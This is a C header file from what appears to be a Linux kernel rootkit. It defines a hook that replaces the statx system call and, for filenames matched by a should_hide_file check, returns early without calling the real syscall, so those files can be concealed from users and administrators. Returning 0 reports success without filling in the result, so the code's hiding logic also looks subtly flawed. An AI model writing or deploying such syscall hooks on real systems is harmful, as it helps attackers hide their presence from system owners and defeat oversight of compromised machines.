#ifndef STATX_HACK_H
#define STATX_HACK_H

#include "../include/headers.h"


static asmlinkage long (*orig_statx)(const struct pt_regs *regs);

notrace static asmlinkage long hooked_statx(const struct pt_regs *regs) {
    const char __user *filename = (const char __user *)regs->si;
    char kfilename[256];
    
    if (strncpy_from_user(kfilename, filename, sizeof(kfilename) - 1) > 0) {
        if (should_hide_file(kfilename)) {
            return 0; 
        }
    }
    
    return orig_statx(regs);
} 

#endif 
